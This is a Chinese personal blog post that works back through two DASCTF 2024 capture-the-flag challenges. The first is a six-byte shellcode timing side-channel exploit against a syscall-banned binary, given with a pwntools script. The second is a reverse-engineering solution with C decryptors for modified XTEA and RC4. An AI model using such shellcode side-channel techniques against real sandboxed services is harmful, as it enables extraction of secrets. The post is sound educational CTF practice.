<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <title>
    
    [复现]DASCTF_2024金秋十月 丨
    

    St4rdd3n&#39;s blog
  </title>

  
  <link rel="shortcut icon" href="/favicon.ico">
  

  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  
  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
  

  <!-- 字体 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

  
<link rel="stylesheet" href="/css/root.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/post.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <header class="header">
  <section class="header-container">
    <a class="logo" href="/">St4rdd3n&#39;s blog</a>
    <ul class="nav">
      
      <li><a href="/tags">tags</a></li>
      
      <li><a href="/archives">archives</a></li>
      
      <li><a href="/about">about</a></li>
      
    </ul>
  </section>
</header>
  <main class="main">
    <article class="post">
  
  <div class="post-title">[复现]DASCTF_2024金秋十月</div>
  <div class="post-meta">
    <div class="date">2024 November 26th</div>
    <div class="tags">
      
      <div class="tag-item">-ctf -复现</div>
      
    </div>
  </div>
  

  <main class="post-content"><h1 id="复现-DASCTF-2024金秋十月｜秋意浓，战火燃，码上见真章"><a href="#复现-DASCTF-2024金秋十月｜秋意浓，战火燃，码上见真章" class="headerlink" title="[复现]DASCTF 2024金秋十月｜秋意浓，战火燃，码上见真章"></a>[复现]DASCTF 2024金秋十月｜秋意浓，战火燃，码上见真章</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="sixbytes"><a href="#sixbytes" class="headerlink" title="sixbytes"></a>sixbytes</h3><p>主要代码就是将flag先读到bss段上来</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/674534be14385.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732253275332.png" alt="1732253275332"></p>
<p>可以写入6字节的shellcode来执行</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/674534ecb0990.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732253309774.png" alt="1732253309774"></p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/6745356299952.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732253334100.png" alt="1732253334100"></p>
<p>在后面会将flag作为第一个参数来执行shellcode，我们的思路就是尽量少的去使用汇编语言来缩段shellcode的长度。第一想法是使用puts的系统调用来将flag去带出来。</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/67453594d392e.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732253504314.png" alt="1732253504314"></p>
<p>保护全开对我们没什么影响，shellcode所在的地方已经给了rwx的权限</p>
<p>可是，，，，，被ban掉了所有的系统调用我焯了（悲）</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/674535cbcf817.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732253872465.png" alt="1732253872465"></p>
<p>那这个题就成了测信道攻击的一个题，只能是写loop来一位一位的校验flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop:</span><br><span class="line">cmp byte ptr[rdi+&#123;&#125;],&#123;&#125;</span><br><span class="line">jg loop</span><br></pre></td></tr></table></figure>

<p>这里使用了此loop，和flag一位一位的校验</p>
<p>jg是如果比较结果大于就跳转，则会无限进行这个比较。</p>
<p>这样就可以写一个try循环来爆出flag</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/674535f58f67f.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732260295138.png" alt="1732260295138"></p>
<p>目前只会一位一位的爆emmm</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cxd</span>(<span class="params">index,char</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">		shell=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">			loop:</span></span><br><span class="line"><span class="string">			cmp byte ptr[rdi+&#123;&#125;],&#123;&#125;</span></span><br><span class="line"><span class="string">			jg loop</span></span><br><span class="line"><span class="string">			&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(index,char))</span><br><span class="line">		<span class="comment">#print(len(shell))</span></span><br><span class="line">		<span class="comment">#debug()</span></span><br><span class="line">		p.sendline(shell)</span><br><span class="line">		receive = p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">except</span> Exception:</span><br><span class="line">		<span class="comment">#flag += chr(char)</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">chr</span>(char))</span><br><span class="line">		p.close()</span><br><span class="line">		exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>,<span class="number">122</span>):</span><br><span class="line">	cxd(<span class="number">0</span>,char)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="EZRE"><a href="#EZRE" class="headerlink" title="EZRE"></a>EZRE</h3><p>查壳是一个带 Themida&#x2F;Winlicense(3.XX)的一个程序，32位，使用unlicense32来脱壳，直接拖着程序到工具上即可，然后会生成一个unpacked的一个程序就是脱壳后的程序</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/6745361717e05.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732366047651.png" alt="1732366047651"></p>
<p>有指令，大概修复了之后会得到这样的函数</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/674536351dd88.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732366558406.png" alt="1732366558406"></p>
<p>密文是经过了两层加密</p>
<p>逆向这里先看看加密2，看特征应该是个tea加密魔改后的样子</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/674536558695b.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732366672977.png" alt="1732366672977"></p>
<p>加密1的话，好像是安不出来什么东西</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/6745367a79ba5.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732366904360.png" alt="1732366904360"></p>
<p>跟进里面的子函数看一看，这里很明显能够看到rc4的特征</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/6745369f857cb.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732366985679.png" alt="1732366985679"></p>
<p>到这里就明白了输入flag之后先进行一个rc4加密，然后进行tea加密，两种加密似乎都是魔改过的</p>
<p>xtea解密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdint.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> v[])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>]=&#123; <span class="number">0x6e982837</span>,<span class="number">0x44332211</span>,<span class="number">0x11223344</span>,<span class="number">0x3728986e</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B8</span>, sum=<span class="number">0xcb9e3951</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt;= <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">5</span>) ^ (v1 &gt;&gt; <span class="number">6</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v[]=&#123;</span><br><span class="line">        <span class="number">0x50</span>, <span class="number">0xD4</span>, <span class="number">0xC8</span>, <span class="number">0xC4</span>, <span class="number">0x8F</span>, <span class="number">0x84</span>, <span class="number">0x40</span>, <span class="number">0xEB</span>, <span class="number">0x32</span>, <span class="number">0x81</span>,</span><br><span class="line">        <span class="number">0x8F</span>, <span class="number">0x85</span>, <span class="number">0x6C</span>, <span class="number">0xB2</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0xBF</span>, <span class="number">0x05</span>, <span class="number">0x35</span>, <span class="number">0x5D</span>,</span><br><span class="line">        <span class="number">0x2E</span>, <span class="number">0xE3</span>, <span class="number">0x7D</span>, <span class="number">0x46</span>, <span class="number">0x8D</span>, <span class="number">0x35</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x3A</span>, <span class="number">0x80</span>,</span><br><span class="line">        <span class="number">0x81</span>, <span class="number">0xC5</span>, <span class="number">0xE6</span>, <span class="number">0x71</span>, <span class="number">0xD3</span>, <span class="number">0xD6</span>, <span class="number">0x50</span>, <span class="number">0x69</span>, <span class="number">0x6F</span>, <span class="number">0xE2</span>,</span><br><span class="line">        <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x14</span>, <span class="number">0xD8</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">36</span>; i &gt;=<span class="number">0</span>; --i)</span><br><span class="line">    &#123;</span><br><span class="line">        (decipher)((<span class="type">unsigned</span> <span class="type">int</span>*) &amp; v[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">36</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解出来是这样的</p>
<p> <img src="https://www.helloimg.com/i/2024/11/26/674536c21c3ca.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732585875265.png" alt="1732585875265"></p>
<p>然后再解rc4也是有魔改的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdint.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* a, <span class="type">unsigned</span> <span class="type">char</span>* b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">go_box</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;th0s_i0_ke9&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        sbox[i] = i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> keyLen = <span class="built_in">strlen</span>((<span class="type">char</span>*)key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Ttable[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        Ttable[i] = key[i % keyLen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + sbox[i] + Ttable[i]) % <span class="number">256</span>;</span><br><span class="line">        swap(&amp;sbox[i], &amp;sbox[j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4de</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> data[], <span class="type">unsigned</span> <span class="type">char</span> new_data[])</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k, i = <span class="number">0</span>, j = <span class="number">0</span>, t;</span><br><span class="line">    go_box();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dataLen = <span class="built_in">strlen</span>((<span class="type">char</span>*)data);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> h = <span class="number">0</span>; h &lt; dataLen; h++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + sbox[i]) % <span class="number">256</span>;</span><br><span class="line">        swap(&amp;sbox[i], &amp;sbox[j]);</span><br><span class="line">        t = (sbox[i] + sbox[j]) % <span class="number">256</span>;</span><br><span class="line">        k = sbox[t] ^ <span class="number">0x33</span>;</span><br><span class="line">        new_data[h] = (data[h] - k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> v[])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>]=&#123; <span class="number">0x6e982837</span>,<span class="number">0x44332211</span>,<span class="number">0x11223344</span>,<span class="number">0x3728986e</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B8</span>, sum=<span class="number">0xcb9e3951</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt;= <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">5</span>) ^ (v1 &gt;&gt; <span class="number">6</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> new_data[<span class="number">44</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v[]=&#123;</span><br><span class="line">        <span class="number">0x50</span>, <span class="number">0xD4</span>, <span class="number">0xC8</span>, <span class="number">0xC4</span>, <span class="number">0x8F</span>, <span class="number">0x84</span>, <span class="number">0x40</span>, <span class="number">0xEB</span>, <span class="number">0x32</span>, <span class="number">0x81</span>,</span><br><span class="line">        <span class="number">0x8F</span>, <span class="number">0x85</span>, <span class="number">0x6C</span>, <span class="number">0xB2</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0xBF</span>, <span class="number">0x05</span>, <span class="number">0x35</span>, <span class="number">0x5D</span>,</span><br><span class="line">        <span class="number">0x2E</span>, <span class="number">0xE3</span>, <span class="number">0x7D</span>, <span class="number">0x46</span>, <span class="number">0x8D</span>, <span class="number">0x35</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x3A</span>, <span class="number">0x80</span>,</span><br><span class="line">        <span class="number">0x81</span>, <span class="number">0xC5</span>, <span class="number">0xE6</span>, <span class="number">0x71</span>, <span class="number">0xD3</span>, <span class="number">0xD6</span>, <span class="number">0x50</span>, <span class="number">0x69</span>, <span class="number">0x6F</span>, <span class="number">0xE2</span>,</span><br><span class="line">        <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x14</span>, <span class="number">0xD8</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">36</span>; i &gt;=<span class="number">0</span>; --i)</span><br><span class="line">    &#123;</span><br><span class="line">        (decipher)((<span class="type">unsigned</span> <span class="type">int</span>*) &amp; v[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">36</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    rc4de(v,new_data);</span><br><span class="line">    <span class="built_in">puts</span>(new_data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <img src="https://www.helloimg.com/i/2024/11/26/674536dc15701.png" alt="img"> </p>
<p><img src="C:\Users\51936\AppData\Roaming\Typora\typora-user-images\1732587642292.png" alt="1732587642292"></p>
<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>不要问为什么只写了两个题，其他题我要是能看懂wp我就复现了。</p>
<p>此刻真诚已成艺术，，，</p>
</main>

</article>


<script src="/js/highlight.js"></script>

  </main>
  <footer class="footer">
  
  <span>Copyright © St4rdd3n</span>
  
</footer>
  
<script src="/js/theme.js"></script>

</body>

</html>